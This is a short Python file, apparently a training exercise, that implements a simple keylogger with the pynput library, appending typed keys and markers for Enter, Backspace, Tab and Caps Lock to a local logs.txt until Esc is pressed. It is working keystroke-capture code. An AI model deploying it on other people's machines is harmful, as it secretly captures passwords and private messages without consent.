# Task-04
# Simple Keylogger
# Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

# import the required libraries
import pynput 
from pynput.keyboard import Key, Listener 

# define the path to the log file
logs = 'logs.txt'

# define the special keys
enter = '<enter>'
backspace = '<backspace>'
caps_lock = '<caps_lock>'
tab = '<tab>'

# define the on_press function
def on_press(key):
	with open(logs,'a') as f_in:

		# check if the key is a special key
		if type(key) == pynput.keyboard._win32.KeyCode:
			try:
				f_in.write(key.char)

			except Exception:
				pass

		# write the special key
		else:
			if str(key) == 'Key.space':
				f_in.write(' ')
			elif str(key) == 'Key.enter':
				f_in.write(enter)
			elif str(key) == 'Key.backspace':
				f_in.write(backspace)
			elif str(key) == 'Key.caps_lock':
				f_in.write(caps_lock)
			elif str(key) == 'Key.tab':
					f_in.write(tab)
			elif str(key) == 'Key.esc':     # Press 'esc' to stop the keylogger
				exit()

# create a listener object
with Listener(on_press = on_press) as listener:
	listener.join() 